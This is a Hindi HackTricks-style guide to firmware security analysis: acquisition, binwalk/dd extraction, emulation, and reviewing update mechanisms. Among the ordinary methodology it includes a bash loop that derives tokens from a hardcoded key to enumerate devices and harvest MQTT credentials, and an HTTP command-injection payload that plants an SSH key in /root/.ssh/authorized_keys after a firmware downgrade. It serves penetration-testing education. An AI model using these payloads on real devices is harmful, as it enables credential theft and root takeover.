# फर्मवेयर विश्लेषण

{{#include ../../banners/hacktricks-training.md}}

## **परिचय**

### संबंधित संसाधन


{{#ref}}
synology-encrypted-archive-decryption.md
{{#endref}}

{{#ref}}
../../network-services-pentesting/32100-udp-pentesting-pppp-cs2-p2p-cameras.md
{{#endref}}


फर्मवेयर आवश्यक सॉफ़्टवेयर है जो डिवाइस को सही तरीके से संचालित करने में सक्षम बनाता है, और हार्डवेयर घटकों और उपयोगकर्ताओं द्वारा इंटरैक्ट किए जाने वाले सॉफ़्टवेयर के बीच संचार को प्रबंधित तथा सुविधाजनक बनाता है। इसे स्थायी मेमोरी में संग्रहित किया जाता है, जिससे डिवाइस पावर ऑन होते ही महत्वपूर्ण निर्देशों तक पहुंच सकता है और ऑपरेटिंग सिस्टम के लॉन्च होने की प्रक्रिया सुनिश्चित होती है। फर्मवेयर की जांच और संभावित रूप से संशोधन करना सुरक्षा कमजोरियों की पहचान करने का एक महत्वपूर्ण चरण है।

## **सूचना एकत्र करना**

**सूचना एकत्र करना** किसी डिवाइस की संरचना और उसके उपयोग किए गए प्रौद्योगिकियों को समझने में एक प्रारंभिक और महत्वपूर्ण चरण है। इस प्रक्रिया में निम्नलिखित डेटा एकत्र करना शामिल है:

- CPU architecture और चलने वाले operating system के बारे में जानकारी
- Bootloader विशेषताएँ
- हार्डवेयर लेआउट और datasheets
- कोडबेस मीट्रिक्स और source स्थान
- बाहरी लाइब्रेरी और license प्रकार
- अपडेट इतिहास और नियामक प्रमाणपत्र
- आर्किटेक्चरल और flow डायग्राम
- सुरक्षा आकलन और पहचानी गई कमजोरियाँ

इस उद्देश्य के लिए **open-source intelligence (OSINT)** उपकरण अमूल्य हैं, जैसा कि किसी भी उपलब्ध open-source सॉफ़्टवेयर घटकों का मैन्युअल और स्वचालित समीक्षा प्रक्रियाओं के माध्यम से विश्लेषण भी होता है। [Coverity Scan](https://scan.coverity.com) और [Semmle’s LGTM](https://lgtm.com/#explore) जैसे टूल मुफ्त static analysis प्रदान करते हैं जिन्हें संभावित समस्याओं को खोजने के लिए उपयोग किया जा सकता है।

## **फर्मवेयर प्राप्त करना**

फर्मवेयर प्राप्त करने के कई तरीके होते हैं, जिनमें से प्रत्येक की जटिलता अलग होती है:

- **सीधे** स्रोत से (developers, manufacturers) प्राप्त करना
- दिए गए निर्देशों से **build** करना
- आधिकारिक support साइटों से **download** करना
- host किए गए firmware फाइलों को खोजने के लिए **Google dork** queries का उपयोग
- सीधे **cloud storage** तक पहुंच, जैसे [S3Scanner](https://github.com/sa7mon/S3Scanner) जैसे टूल्स का उपयोग करके
- अपडेट्स को **intercept** करना via man-in-the-middle techniques
- डिवाइस से **extract** करना UART, JTAG, या PICit जैसी कनेक्शनों के माध्यम से
- डिवाइस संचार में update requests को **sniff** करना
- हार्डकोडेड update endpoints की पहचान और उपयोग
- bootloader या नेटवर्क से **dump** करना
- जब सभी प्रयास विफल हों, तो उपयुक्त hardware tools का उपयोग करके storage chip को **remove और read** करना

## फर्मवेयर का विश्लेषण

अब जब आपके पास **फर्मवेयर है**, आपको यह जानने के लिए उससे जानकारी निकालनी होगी कि उसे कैसे संभालना है। इसके लिए आप जिन विभिन्न उपकरणों का उपयोग कर सकते हैं:
```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #print offsets in hex
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head # might find signatures in header
fdisk -lu <bin> #lists a drives partition and filesystems if multiple
```
यदि उन उपकरणों से ज्यादा कुछ नहीं मिलता है तो इमेज की **entropy** `binwalk -E <bin>` से चेक करें, अगर entropy कम है तो यह संभवतः encrypted नहीं है। अगर entropy अधिक है तो यह संभवतः encrypted (या किसी तरह से compressed) है।

इसके अलावा, आप इन टूल्स का उपयोग firmware के अंदर embedded **files** को extract करने के लिए कर सकते हैं:

{{#ref}}
../../generic-methodologies-and-resources/basic-forensic-methodology/partitions-file-systems-carving/file-data-carving-recovery-tools.md
{{#endref}}

Or [**binvis.io**](https://binvis.io/#/) ([code](https://code.google.com/archive/p/binvis/)) to inspect the file.

### Filesystem प्राप्त करना

पहले बताए गए टूल्स जैसे `binwalk -ev <bin>` से आप **filesystem को extract** करने में सक्षम होना चाहिए।\ Binwalk आमतौर पर इसे **filesystem type के नाम वाले folder** के अंदर extract करता है, जो आमतौर पर निम्न में से एक होता है: squashfs, ubifs, romfs, rootfs, jffs2, yaffs2, cramfs, initramfs.

#### मैनुअल Filesystem Extraction

कभी-कभी, binwalk के signatures में **filesystem का magic byte** मौजूद नहीं होता। ऐसे मामलों में, binwalk का उपयोग करके **filesystem का offset ढूँढें और binary से compressed filesystem को carve करें**, और फिर नीचे दिए गए चरणों के अनुसार filesystem को **मैन्युअल रूप से extract** करें।
```
$ binwalk DIR850L_REVB.bin

DECIMAL HEXADECIMAL DESCRIPTION
----------------------------------------------------------------------------- ---

0 0x0 DLOB firmware header, boot partition: """"dev=/dev/mtdblock/1""""
10380 0x288C LZMA compressed data, properties: 0x5D, dictionary size: 8388608 bytes, uncompressed size: 5213748 bytes
1704052 0x1A0074 PackImg section delimiter tag, little endian size: 32256 bytes; big endian size: 8257536 bytes
1704084 0x1A0094 Squashfs filesystem, little endian, version 4.0, compression:lzma, size: 8256900 bytes, 2688 inodes, blocksize: 131072 bytes, created: 2016-07-12 02:28:41
```
Squashfs filesystem को carving करने के लिए निम्नलिखित **dd command** चलाएँ।
```
$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs

8257536+0 records in

8257536+0 records out

8257536 bytes (8.3 MB, 7.9 MiB) copied, 12.5777 s, 657 kB/s
```
वैकल्पिक रूप से, निम्नलिखित कमांड भी चलाया जा सकता है।

`$ dd if=DIR850L_REVB.bin bs=1 skip=$((0x1A0094)) of=dir.squashfs`

- squashfs के लिए (उपरोक्त उदाहरण में उपयोग किया गया)

`$ unsquashfs dir.squashfs`

फाइलें बाद में `squashfs-root` डायरेक्टरी में होंगी।

- CPIO archive फाइलें

`$ cpio -ivd --no-absolute-filenames -F <bin>`

- jffs2 फाइल सिस्टम के लिए

`$ jefferson rootfsfile.jffs2`

- NAND flash वाले ubifs फाइल सिस्टम के लिए

`$ ubireader_extract_images -u UBI -s <start_offset> <bin>`

`$ ubidump.py <bin>`

## फर्मवेयर का विश्लेषण

एक बार फर्मवेयर प्राप्त हो जाने पर, इसकी संरचना और संभावित कमजोरियों को समझने के लिए इसे विस्तार से विश्लेषित करना आवश्यक है। इस प्रक्रिया में फर्मवेयर इमेज से मूल्यवान डेटा निकालने और विश्लेषण करने के लिए विभिन्न टूल्स का उपयोग शामिल है।

### प्रारंभिक विश्लेषण उपकरण

बाइनरी फाइल (जिसे `<bin>` कहा गया है) की प्रारंभिक जाँच के लिए एक कमांड सेट दिया गया है। ये कमांड फाइल प्रकारों की पहचान करने, स्ट्रिंग्स निकालने, बाइनरी डेटा का विश्लेषण करने, और partition तथा filesystem विवरण समझने में मदद करते हैं:
```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #prints offsets in hexadecimal
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head #useful for finding signatures in the header
fdisk -lu <bin> #lists partitions and filesystems, if there are multiple
```
इमेज की encryption स्थिति का आकलन करने के लिए, **entropy** की जाँच `binwalk -E <bin>` से की जाती है। कम entropy आम तौर पर encryption की अनुपस्थिति का संकेत देती है, जबकि उच्च entropy संभावित encryption या compression का संकेत देती है।

इम्बेडेड फाइल्स निकालने के लिए, **file-data-carving-recovery-tools** डॉक्यूमेंटेशन और फाइल निरीक्षण के लिए **binvis.io** जैसे टूल्स और संसाधन सुझाए जाते हैं।

### Extracting the Filesystem

`binwalk -ev <bin>` का उपयोग करके सामान्यतः filesystem को extract किया जा सकता है, अक्सर उस filesystem प्रकार के नाम पर एक डायरेक्टरी में (जैसे squashfs, ubifs)। हालाँकि, जब **binwalk** magic bytes की अनुपस्थिति के कारण filesystem प्रकार को पहचानने में विफल हो जाता है, तब मैन्युअल extraction आवश्यक होता है। इसके अंतर्गत पहले `binwalk` से filesystem का offset खोजा जाता है, और फिर `dd` कमांड का उपयोग करके filesystem को carve out किया जाता है:
```bash
$ binwalk DIR850L_REVB.bin

$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs
```
उसके बाद, फ़ाइल सिस्टम के प्रकार (उदा., squashfs, cpio, jffs2, ubifs) के आधार पर, सामग्री को मैन्युअली निकालने के लिए अलग-अलग कमांड्स उपयोग किए जाते हैं।

### फ़ाइल सिस्टम विश्लेषण

फ़ाइल सिस्टम निकालने के बाद, सुरक्षा कमियों की खोज शुरू होती है। ध्यान असुरक्षित network daemons, hardcoded credentials, API endpoints, update server functionalities, uncompiled code, startup scripts, और compiled binaries की offline analysis पर रखा जाता है।

**Key locations** और **items** जिन्हें जांचना चाहिए, शामिल हैं:

- **etc/shadow** और **etc/passwd** — user credentials के लिए
- SSL certificates और keys **etc/ssl** में
- Configuration और script files संभावित vulnerabilities के लिए
- आगे की analysis के लिए embedded binaries
- सामान्य IoT device के web servers और binaries

फ़ाइल सिस्टम के भीतर sensitive information और vulnerabilities का पता लगाने में कई tools मदद करते हैं:

- [**LinPEAS**](https://github.com/carlospolop/PEASS-ng) और [**Firmwalker**](https://github.com/craigz28/firmwalker) sensitive information search के लिए
- [**The Firmware Analysis and Comparison Tool (FACT)**](https://github.com/fkie-cad/FACT_core) comprehensive firmware analysis के लिए
- [**FwAnalyzer**](https://github.com/cruise-automation/fwanalyzer), [**ByteSweep**](https://gitlab.com/bytesweep/bytesweep), [**ByteSweep-go**](https://gitlab.com/bytesweep/bytesweep-go), और [**EMBA**](https://github.com/e-m-b-a/emba) static और dynamic analysis के लिए

### Compiled Binaries पर सुरक्षा जांच

फ़ाइल सिस्टम में मिले source code और compiled binaries को vulnerabilities के लिए ध्यान से जांचना चाहिए। Unix binaries के लिए **checksec.sh** और Windows binaries के लिए **PESecurity** जैसे tools उन unprotected binaries की पहचान करने में मदद करते हैं जिन्हें exploit किया जा सकता है।

## Derived URL tokens के जरिए cloud config और MQTT credentials निकालना

कई IoT hubs अपने प्रति-डिवाइस configuration को उस तरह के cloud endpoint से लाते हैं:

- [https://<api-host>/pf/<deviceId>/<token>](https://<api-host>/pf/<deviceId>/<token>)

Firmware analysis के दौरान आप पा सकते हैं कि <token> स्थानीय रूप से device ID और hardcoded secret से derive किया गया है, उदाहरण के लिए:

- token = MD5( deviceId || STATIC_KEY ) and represented as uppercase hex

यह डिज़ाइन किसी को भी जो deviceId और STATIC_KEY जानता है, URL reconstruct करके cloud config खींचने में सक्षम बनाता है, जो अक्सर plaintext MQTT credentials और topic prefixes को उजागर कर देता है।

प्रैक्टिकल workflow:

1) UART boot logs से deviceId निकालें

- 3.3V UART adapter (TX/RX/GND) कनेक्ट करें और logs कैप्चर करें:
```bash
picocom -b 115200 /dev/ttyUSB0
```
- उदाहरण के लिए cloud config URL pattern और broker address प्रिंट करने वाली लाइनों को देखें:
```
Online Config URL https://api.vendor.tld/pf/<deviceId>/<token>
MQTT: mqtt://mq-gw.vendor.tld:8001
```
2) फ़र्मवेयर से STATIC_KEY और token एल्गोरिथ्म पुनर्प्राप्त करें

- बाइनरीज़ को Ghidra/radare2 में लोड करें और config path ("/pf/") या MD5 उपयोग के लिए खोजें।
- एल्गोरिथ्म की पुष्टि करें (उदा., MD5(deviceId||STATIC_KEY)).
- Bash में token निकालें और digest को uppercase करें:
```bash
DEVICE_ID="d88b00112233"
STATIC_KEY="cf50deadbeefcafebabe"
printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}'
```
3) क्लाउड config और MQTT credentials इकट्ठा करें

- URL बनाएं और curl से JSON खींचें; jq से पार्स करके secrets निकालें:
```bash
API_HOST="https://api.vendor.tld"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -sS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq .
# Fields often include: mqtt host/port, clientId, username, password, topic prefix (tpkfix)
```
4) plaintext MQTT और weak topic ACLs का दुरुपयोग करें (यदि मौजूद हों)

- Use recovered credentials to subscribe to maintenance topics and look for sensitive events:
```bash
mosquitto_sub -h <broker> -p <port> -V mqttv311 \
-i <client_id> -u <username> -P <password> \
-t "<topic_prefix>/<deviceId>/admin" -v
```
5) अनुमानित device IDs को सूचीबद्ध करें (at scale, with authorization)

- कई ecosystems में vendor OUI/product/type bytes एम्बेड होते हैं, जिनके बाद एक sequential suffix होता है।
- आप candidate IDs को iterate कर सकते हैं, tokens derive कर सकते हैं और configs को programmatically fetch कर सकते हैं:
```bash
API_HOST="https://api.vendor.tld"; STATIC_KEY="cf50deadbeef"; PREFIX="d88b1603" # OUI+type
for SUF in $(seq -w 000000 0000FF); do
DEVICE_ID="${PREFIX}${SUF}"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -fsS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq -r '.mqtt.username,.mqtt.password' | sed "/null/d" && echo "$DEVICE_ID"
done
```
नोट
- mass enumeration का प्रयास करने से पहले हमेशा स्पष्ट authorization प्राप्त करें।
- जहाँ संभव हो, target hardware को modify किए बिना secrets recover करने के लिए emulation या static analysis को प्राथमिकता दें।

The process of emulating firmware enables **dynamic analysis** either of a device's operation or an individual program. This approach can encounter challenges with hardware or architecture dependencies, but transferring the root filesystem or specific binaries to a device with matching architecture and endianness, such as a Raspberry Pi, or to a pre-built virtual machine, can facilitate further testing.

### Emulating Individual Binaries

एकल programs की जाँच के लिए, program की endianness और CPU architecture की पहचान करना महत्वपूर्ण है।

#### MIPS Architecture के साथ उदाहरण

MIPS architecture binary को emulate करने के लिए, निम्न command का उपयोग किया जा सकता है:
```bash
file ./squashfs-root/bin/busybox
```
और आवश्यक emulation tools स्थापित करने के लिए:
```bash
sudo apt-get install qemu qemu-user qemu-user-static qemu-system-arm qemu-system-mips qemu-system-x86 qemu-utils
```
For MIPS (big-endian) के लिए `qemu-mips` का उपयोग किया जाता है, और little-endian बाइनरीज़ के लिए `qemu-mipsel` चुना जाता है।

#### ARM आर्किटेक्चर इम्यूलेशन

ARM बाइनरीज़ के लिए प्रक्रिया समान है, और इम्यूलेशन के लिए `qemu-arm` इम्युलेटर का उपयोग किया जाता है।

### पूर्ण सिस्टम इम्यूलेशन

जैसे [Firmadyne](https://github.com/firmadyne/firmadyne), [Firmware Analysis Toolkit](https://github.com/attify/firmware-analysis-toolkit), और अन्य टूल्स पूर्ण firmware इम्यूलेशन को सुविधाजनक बनाते हैं, प्रक्रिया को स्वचालित करते हैं और डायनामिक विश्लेषण में मदद करते हैं।

## व्यवहार में डायनामिक विश्लेषण

इस चरण में विश्लेषण के लिए वास्तविक या इम्यूलेटेड डिवाइस वातावरण का उपयोग किया जाता है। OS और फ़ाइलसिस्टम तक shell एक्सेस बनाए रखना आवश्यक है। इम्यूलेशन हमेशा हार्डवेयर इंटरैक्शन्स की सही नकल नहीं कर पाता, इसलिए कभी-कभी इम्यूलेशन को रीस्टार्ट करना पड़ सकता है। विश्लेषण के दौरान फ़ाइलसिस्टम को फिर से जाँचना चाहिए, एक्सपोज़ किए गए वेबपेज और नेटवर्क सेवाओं का फायदा उठाना चाहिए, और bootloader की कमजोरियों का पता लगाना चाहिए। फर्मवेयर की integrity टेस्टिंग महत्वपूर्ण है ताकि संभावित बैकडोर कमजोरियाँ पहचानी जा सकें।

## रनटाइम विश्लेषण तकनीकें

रनटाइम विश्लेषण में किसी process या binary के ऑपरेटिंग वातावरण में इंटरैक्ट करना शामिल है, जहाँ breakpoints सेट करने और fuzzing तथा अन्य तकनीकों के माध्यम से कमजोरियों की पहचान करने के लिए gdb-multiarch, Frida, और Ghidra जैसे टूल्स का उपयोग किया जाता है।

## बाइनरी एक्सप्लॉइटेशन और Proof-of-Concept

पहचानी गई कमजोरियों के लिए PoC विकसित करने के लिए लक्ष्य आर्किटेक्चर की गहरी समझ और लोअर-लेवल भाषाओं में प्रोग्रामिंग आवश्यक है। एम्बेडेड सिस्टम्स में बाइनरी रनटाइम प्रोटेक्शन्स दुर्लभ होते हैं, लेकिन अगर मौजूद हों तो Return Oriented Programming (ROP) जैसी तकनीकें आवश्यक हो सकती हैं।

## फर्मवेयर विश्लेषण के लिए तैयार ऑपरेटिंग सिस्टम्स

[AttifyOS](https://github.com/adi0x90/attifyos) और [EmbedOS](https://github.com/scriptingxss/EmbedOS) जैसे ऑपरेटिंग सिस्टम फर्मवेयर सुरक्षा परीक्षण के लिए पहले से कॉन्फ़िगर किए हुए वातावरण प्रदान करते हैं, जिनमें आवश्यक टूल्स होते हैं।

## फर्मवेयर का विश्लेषण करने के लिए तैयार OSs

- [**AttifyOS**](https://github.com/adi0x90/attifyos): AttifyOS एक distro है जो आपको Internet of Things (IoT) devices के security assessment और penetration testing करने में मदद करने के लिए बनाया गया है। यह सभी आवश्यक टूल्स के साथ पहले से कॉन्फ़िगर किया हुआ वातावरण प्रदान करके आपका बहुत समय बचाता है।
- [**EmbedOS**](https://github.com/scriptingxss/EmbedOS): Embedded security testing operating system जो Ubuntu 18.04 पर आधारित है और फर्मवेयर सुरक्षा परीक्षण टूल्स के साथ प्रीलोडेड है।

## Firmware Downgrade Attacks & Insecure Update Mechanisms

भले ही कोई vendor firmware images के लिए cryptographic signature checks लागू कर दे, **version rollback (downgrade) protection अक्सर छोड़ दी जाती है**। जब boot- या recovery-loader केवल एक embedded public key से सिग्नेचर को verify करता है पर फ्लैश की जा रही इमेज के *version* (या एक monotonic counter) की तुलना नहीं करता, तो एक attacker वैध तरीके से एक **पुराना, vulnerable firmware इंस्टॉल कर सकता है जिसपर अभी भी valid signature मौजूद होता है** और इस तरह पैच की गई कमजोरियों को फिर से वापस ला सकता है।

Typical attack workflow:

1. **Obtain an older signed image**
* इसे vendor के public download portal, CDN या support site से लें।
* इसे companion mobile/desktop applications से निकालें (उदा. एक Android APK के अंदर `assets/firmware/` में)।
* इसे third-party repositories जैसे VirusTotal, Internet archives, forums, इत्यादि से प्राप्त करें।
2. **Upload or serve the image to the device** via any exposed update channel:
* Web UI, mobile-app API, USB, TFTP, MQTT, etc.
* कई consumer IoT devices ऐसे *unauthenticated* HTTP(S) endpoints एक्सपोज़ करते हैं जो Base64-encoded firmware blobs स्वीकार करते हैं, उन्हें server-side पर decode करते हैं और recovery/upgrade ट्रिगर करते हैं।
3. डाउनग्रेड के बाद उस vulnerability का exploit करें जो नए रिलीज़ में पैच की गई थी (उदाहरण के लिए बाद में जोड़ा गया command-injection filter)।
4. वैकल्पिक रूप से latest image को वापस फ्लैश करें या persistence हासिल होने पर detection से बचने के लिए updates को disable कर दें।

### उदाहरण: डाउनग्रेड के बाद Command Injection
```http
POST /check_image_and_trigger_recovery?md5=1; echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC...' >> /root/.ssh/authorized_keys HTTP/1.1
Host: 192.168.0.1
Content-Type: application/octet-stream
Content-Length: 0
```
कमजोर (downgraded) firmware में, `md5` parameter को बिना sanitisation के सीधे एक shell command में concatenated किया जाता है, जिससे arbitrary commands का injection संभव होता है (यहाँ – SSH key-based root access सक्षम करना)। बाद के firmware versions में एक basic character filter जोड़ा गया, लेकिन downgrade protection की अनुपस्थिति इस fix को moot बना देती है।

### मोबाइल एप्स से Firmware निकालना

कई विक्रेता अपने companion mobile applications के अंदर full firmware images बंडल करते हैं ताकि app डिवाइस को Bluetooth/Wi-Fi के माध्यम से अपडेट कर सके। ये packages आमतौर पर unencrypted रूप में APK/APEX के अंदर `assets/fw/` या `res/raw/` जैसे paths पर रखे जाते हैं। `apktool`, `ghidra`, या साधारण `unzip` जैसे tools आपको physical hardware को छुए बिना signed images निकालने की अनुमति देते हैं।
```
$ apktool d vendor-app.apk -o vendor-app
$ ls vendor-app/assets/firmware
firmware_v1.3.11.490_signed.bin
```
### अपडेट लॉजिक का आकलन करने के लिए चेकलिस्ट

* क्या *update endpoint* का transport/authentication पर्याप्त रूप से सुरक्षित है (TLS + authentication)?
* क्या डिवाइस flashing से पहले **version numbers** या **monotonic anti-rollback counter** की तुलना करता है?
* क्या image को secure boot chain के भीतर verified किया जाता है (उदा. signatures ROM code द्वारा चेक किए जाते हैं)?
* क्या userland code अतिरिक्त sanity checks करता है (उदा. allowed partition map, model number)?
* क्या *partial* या *backup* update flows वही validation logic पुनः उपयोग कर रहे हैं?

> 💡  यदि ऊपर में से कोई भी मौजूद नहीं है, तो प्लेटफ़ॉर्म संभवतः rollback attacks के प्रति vulnerable है।

## अभ्यास के लिए Vulnerable firmware

firmware में vulnerabilities खोजने का अभ्यास करने के लिए, निम्नलिखित vulnerable firmware projects को प्रारम्भिक बिंदु के रूप में उपयोग करें।

- OWASP IoTGoat
- [https://github.com/OWASP/IoTGoat](https://github.com/OWASP/IoTGoat)
- The Damn Vulnerable Router Firmware Project
- [https://github.com/praetorian-code/DVRF](https://github.com/praetorian-code/DVRF)
- Damn Vulnerable ARM Router (DVAR)
- [https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html](https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html)
- ARM-X
- [https://github.com/therealsaumil/armx#downloads](https://github.com/therealsaumil/armx#downloads)
- Azeria Labs VM 2.0
- [https://azeria-labs.com/lab-vm-2-0/](https://azeria-labs.com/lab-vm-2-0/)
- Damn Vulnerable IoT Device (DVID)
- [https://github.com/Vulcainreo/DVID](https://github.com/Vulcainreo/DVID)

## संदर्भ

- [https://scriptingxss.gitbook.io/firmware-security-testing-methodology/](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
- [Practical IoT Hacking: The Definitive Guide to Attacking the Internet of Things](https://www.amazon.co.uk/Practical-IoT-Hacking-F-Chantzis/dp/1718500904)
- [Exploiting zero days in abandoned hardware – Trail of Bits blog](https://blog.trailofbits.com/2025/07/25/exploiting-zero-days-in-abandoned-hardware/)


- [How a $20 Smart Device Gave Me Access to Your Home](https://bishopfox.com/blog/how-a-20-smart-device-gave-me-access-to-your-home)

## प्रशिक्षण और प्रमाणन

- [https://www.attify-store.com/products/offensive-iot-exploitation](https://www.attify-store.com/products/offensive-iot-exploitation)

{{#include ../../banners/hacktricks-training.md}}
